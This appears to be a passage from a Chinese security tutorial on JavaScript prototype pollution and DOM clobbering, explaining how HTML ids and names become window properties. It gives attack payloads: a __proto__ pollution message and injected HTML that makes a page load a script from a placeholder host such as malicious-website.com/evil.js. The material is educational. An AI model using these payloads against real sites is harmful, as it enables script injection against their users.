<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">body</span> = <span class="hljs-string">&quot;a=1&quot;</span>;<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method</span> = <span class="hljs-string">&quot;POST&quot;</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;https://example.com&quot;</span>, &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&quot;cors&quot;</span>,<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>最后来看这个代码 通过传入3个参数将对应的地方变成指定颜色  </p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gml">onmessage = <span class="hljs-keyword">function</span>(event)&#123;<br>  const &#123; <span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, color &#125; = event.data<br>  <span class="hljs-comment">// for example, screen[10][5] = &#x27;red&#x27;</span><br>  screen[<span class="hljs-variable language_">y</span>][<span class="hljs-variable language_">x</span>] = color<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是可以使用如下payload  </p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less">&#123;<br>  <span class="hljs-attribute">y</span>: <span class="hljs-string">&#x27;__proto__&#x27;</span>,<br>  <span class="hljs-attribute">x</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>  <span class="hljs-attribute">color</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>去进行原型链污染  </p>
<p><strong>constructor属性</strong>  </p>
<p><code>prototype</code>对象有一个<code>constructor</code>属性，默认指向<code>prototype</code>对象所在的构造函数  </p>
<p>表示原型对象与构造函数之间的关联关系  </p>
<p>可以得知某个实例对象，到底是哪一个构造函数产生的  </p>
<p>  <a target="_blank" rel="noopener" href="https://wangdoc.com/javascript/oop/prototype">https://wangdoc.com/javascript/oop/prototype</a> 可以参考这篇文章  </p>
<h3 id="html代码来操作js"><a href="#html代码来操作js" class="headerlink" title="html代码来操作js"></a>html代码来操作js</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">btn</span>) <span class="hljs-comment">// </span></span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span></span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>看这段代码  </p>
<p>可以看出 访问页面上 <code>id=&quot;btn&quot;</code> 的 DOM 元素，并将它打印到控制台。  </p>
<p><strong>当 HTML 元素的 <code>id</code> 与 JavaScript 中没有命名冲突时，浏览器会将该元素作为 <code>window</code> 对象的属性。</strong>  </p>
<h4 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h4><p>在 JavaScript 中，<code>window</code> 是浏览器环境中提供的一个 <strong>全局对象</strong>，它代表了当前浏览器窗口或框架（如 iframe）。作为 JavaScript 的全局环境，<code>window</code> 提供了许多内置属性和方法来操作和访问浏览器及其内容。</p>
<p>如果在代码中声明一个全局变量或函数，它们会自动成为 <code>window</code> 对象的属性或方法。  </p>
<p>例如  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> myVar = <span class="hljs-number">123</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunc</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hello!&quot;</span>);<br>&#125;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(window.myVar); <span class="hljs-comment">// 123</span><br>window.myFunc();           <span class="hljs-comment">// &quot;Hello!&quot;</span><br></code></pre></td></tr></table></figure>

<p><code>window</code> 是浏览器中的根对象，表示整个浏览器窗口。</p>
<p>所有全局的 JavaScript 对象、函数和变量都是它的属性。  </p>
<p><strong><code>window</code> 的常用属性和方法</strong>  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412181140531.png" srcset="/img/loading.gif" lazyload alt="1734493211451"></p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412181140263.png" srcset="/img/loading.gif" lazyload alt="1734493229548"></p>
<p>可以看出xss常用的弹窗函数 alert 其实也就是window这个对象里面的方法  </p>
<p>所以说 回到上面 也可以这样来写  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(window.btn); <span class="hljs-comment">// 通过 window 对象访问按钮</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(btn);        <span class="hljs-comment">// 直接通过变量名访问按钮</span><br></code></pre></td></tr></table></figure>

<p>这两种写法在大多数情况下的作用是相同的  </p>
<p>但是 如果页面中存在一个全局变量名为 <code>btn</code>，那么该变量会覆盖 <code>window.btn</code> 的默认行为。  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> btn = <span class="hljs-string">&quot;This is not a button&quot;</span>;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(btn);        <span class="hljs-comment">// 输出: &quot;This is not a button&quot;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(window.btn); <span class="hljs-comment">// 仍然是按钮 DOM 元素</span><br></code></pre></td></tr></table></figure>

<hr>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> add click event listener to button</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>因此 在上面的script标签里面 如何填入代码使得点击按钮时能弹出弹窗  </p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">document.getElementById(<span class="hljs-string">&#x27;btn&#x27;</span>)<br>  .addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    alert(<span class="hljs-number">1</span>)<br>  &#125;)<br></code></pre></td></tr></table></figure>

<p>当然这种可以  </p>
<p>如果要最短的话  </p>
<p>结合上面的应该是  </p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">btn.onclick=<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>



<p>除了id这个属性之外 还有其他的属性可以像id一样通过window直接访问  </p>
<p><code>&lt;embed&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;img&gt;</code>, 和 <code>&lt;object&gt;</code> 这四种 HTML 元素，如果它们有 <code>name</code> 属性，浏览器会将 <code>name</code> 的值作为 <code>window</code> 对象的属性，直接引用该元素。  </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">myForm</span>); <span class="hljs-comment">// 直接访问到 </span></span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span></span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>



<h3 id="总结html和js"><a href="#总结html和js" class="headerlink" title="总结html和js"></a>总结html和js</h3><p>到这也可以来总结一下 html和js之间的联系  </p>
<p>HTML 是结构，JavaScript 是逻辑  </p>
<p><strong>HTML 和 JavaScript 是如何交互的</strong>  </p>
<p><strong>HTML 元素成为 JavaScript 的一部分：</strong> 在浏览器中，HTML 元素被解析成 DOM（Document Object Model），而 DOM 是 JavaScript 能直接操作的对象模型。这种解析让 HTML 和 JavaScript 成为同一个环境的一部分。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myDiv&quot;</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">myDiv</span>); <span class="hljs-comment">// JavaScript 能直接访问 HTML 中的 DOM</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myDiv&#x27;</span>)); <span class="hljs-comment">// 等效访问</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>HTML 元素的属性可以传递数据到 JavaScript：</strong> 一些 HTML 元素的属性（如 <code>id</code>, <code>name</code>, <code>value</code>）不仅仅是它们自己的内容，还能作为数据源传递给 JavaScript。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myInput&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Test value&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myInput&#x27;</span>);</span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(input.<span class="hljs-property">value</span>); <span class="hljs-comment">// 输出 &quot;Test value&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>HTML 属性和 JavaScript 的直接交互：</strong> 某些 HTML 属性（如 <code>onclick</code>, <code>onload</code>）直接绑定到 JavaScript 函数，可以触发执行逻辑。  </p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">button</span> <span class="hljs-keyword">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Button clicked!&#x27;)&quot;</span>&gt;Click me&lt;/<span class="hljs-keyword">button</span>&gt;<br></code></pre></td></tr></table></figure>

<p><strong>由此可见 不仅js可以操作dom模型来影响html html也可以通过修改元素属性的方式来影响js</strong>  </p>
<h3 id="dom破坏"><a href="#dom破坏" class="headerlink" title="dom破坏"></a>dom破坏</h3><p><strong>条件</strong>  </p>
<p>必须在页面上回显你自己写的html  </p>
<p>例如评论区 个人资料等等  </p>
<p>来看可以被利用的例子  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Comments<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    You comment: hello<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">TEST_MODE</span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// load test script</span></span><br><span class="language-javascript">      <span class="hljs-keyword">var</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>)</span><br><span class="language-javascript">      script.<span class="hljs-property">src</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">TEST_SCRIPT_SRC</span></span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script)</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在div里面能编写你的评论 然后会回显到页面上  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;div <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;TEST_MODE&quot;</span>&gt;&lt;/div&gt;<br>    &lt;a <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;TEST_SCRIPT_SRC&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;my_evil_script&quot;</span>&gt;&lt;/a&gt;<br></code></pre></td></tr></table></figure>

<p>如果你输入这些东西的话  </p>
<p>由于插入了<code>&lt;div id=&quot;TEST_MODE&quot;&gt;&lt;/div&gt; </code> 这段 下面的if条件会通过 从而执行下面的添加script元素的相关代码  </p>
<p>再进行类似原型链污染的操作  </p>
<p>这里的实际操作其实是<br><code>script.src = TEST_SCRIPT_SRC.toString()</code>  </p>
<p>这里有一个小trick，当标签是<code>&lt;a&gt;</code>或者<code>&lt;base&gt;</code>，toString()会返回他们的href  </p>
<p>但是要注意的是  </p>
<p>当变量已经存在的时候，就无法通过id进行覆盖了  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>    TEST_MODE = 1<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;TEST_MODE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">TEST_MODE</span>) <span class="hljs-comment">// 1</span></span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>再来个例子  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> someObject = <span class="hljs-variable language_">window</span>.<span class="hljs-property">someObject</span> || &#123;&#125;;</span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);</span><br><span class="language-javascript">        script.<span class="hljs-property">src</span> = someObject.<span class="hljs-property">url</span>;</span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>payload如下  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=someObject&gt;&lt;a <span class="hljs-attribute">id</span>=someObject <span class="hljs-attribute">name</span>=url <span class="hljs-attribute">href</span>=//malicious-website.com/evil.js&gt;<br></code></pre></td></tr></table></figure>



<h4 id="多层的DOM-Clobbering"><a href="#多层的DOM-Clobbering" class="headerlink" title="多层的DOM Clobbering"></a>多层的DOM Clobbering</h4><p>在上一节只是覆盖单个变量，当需要覆盖对象应该如何操作，比如覆盖掉<code>config.isTest</code>，有几种方法进行覆盖  </p>
<p>首先回顾一下  </p>
<p><strong>id属性和name属性</strong>  </p>
<p>HTML 规定，如果一个元素具有 <code>id</code> 属性，该 <code>id</code> 值会成为全局 JavaScript 对象（<code>window</code>）的属性名。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;para1&quot;</span>&gt;</span>This is paragraph 1.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;para2&quot;</span>&gt;</span>This is paragraph 2.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(para1); // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;para1&quot;</span>&gt;</span>This is paragraph 1.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(para2); // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;para2&quot;</span>&gt;</span>This is paragraph 2.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>即使是通过 JavaScript 动态创建的带有 <code>id</code> 属性的元素，也会成为 <code>window</code> 的属性  </p>
<p>name属性则不一样  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412192034803.png" srcset="/img/loading.gif" lazyload alt="1734611686825"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myFrame&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myEmbed&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myObject&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(myForm);   // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(myFrame);  // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myFrame&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(myEmbed);  // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myEmbed&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    console.log(myObject); // 输出: <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myObject&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">  </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>当name属性与from标签相结合时</strong>  </p>
<p><code>&lt;form&gt;</code> 子元素自动成为 <code>form[name]</code> 的属性  </p>
<p>即在 HTML 中，<code>&lt;form&gt;</code> 元素内部的子元素（例如 <code>&lt;input&gt;</code> 或 <code>&lt;button&gt;</code>）如果具有 <code>name</code> 属性，就会自动成为该 <code>&lt;form&gt;</code> 元素的一个属性，并且可以通过 JavaScript 直接通过 <code>form[name]</code> 的方式访问</p>
